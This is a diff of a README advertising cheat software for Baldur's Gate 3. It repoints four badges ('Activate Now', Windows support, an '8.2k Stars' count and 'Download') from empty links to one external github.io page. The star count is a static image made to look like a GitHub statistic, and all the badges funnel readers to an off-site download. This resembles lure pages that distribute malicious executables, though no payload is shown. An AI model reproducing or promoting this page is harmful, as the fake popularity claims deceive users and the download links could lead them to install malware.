@@ -2,10 +2,10 @@
 
 The **Baldur’s Gate 3 Cheat Software** is designed for players who want to explore Faerûn without limits. With an easy-to-use overlay menu, hotkey toggles, and full customization, it allows you to **manage resources, boost combat power, and experiment with builds** on your own terms.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 8.2k Stars](https://img.shields.io/badge/⭐️%208.2k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://baldur-gate-3-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://baldur-gate-3-cheat.github.io/.github/)
+[![⭐️ 8.2k Stars](https://img.shields.io/badge/⭐️%208.2k-Stars-yellow?style=for-the-badge\&logo=github)](https://baldur-gate-3-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://baldur-gate-3-cheat.github.io/.github/)
 
 ---
 
